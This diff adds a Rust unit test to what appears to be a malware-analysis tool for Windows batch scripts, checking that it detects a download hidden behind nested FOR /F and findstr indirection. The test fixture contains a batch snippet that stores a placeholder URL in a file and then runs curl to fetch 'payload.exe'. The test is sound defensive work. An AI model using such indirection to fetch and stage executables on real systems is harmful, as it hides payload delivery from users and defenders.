@@ -3982,6 +3982,28 @@ for /f "tokens=* delims=" %%F in ('findstr /s /m /c:"https://" C:\Work\*.txt') d
     }
 
     #[test]
+    fn for_f_findstr_s_m_bare_wildcard_emits_nested_generated_file_path() {
+        let report = analyze(
+            br#"echo https://for-f-findstr-s-m-bare-wildcard.example/payload.exe>Sub\url.txt
+for /f "tokens=* delims=" %%F in ('findstr /s /m /c:"https://" *.txt') do for /f "tokens=* delims=" %%U in ('type %%F') do curl -o payload.exe %%U"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst: Some(dst), .. }
+                        if src == "https://for-f-findstr-s-m-bare-wildcard.example/payload.exe"
+                            && dst == "payload.exe"
+                )
+            }),
+            "FOR /F findstr /s /m bare wildcard did not emit nested generated file path for later type: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn for_f_where_recursive_wildcard_discovers_generated_file_source() {
         let report = analyze(
             br#"echo https://for-f-where-recursive-wildcard.example/payload.exe>C:\Work\Sub\url.txt
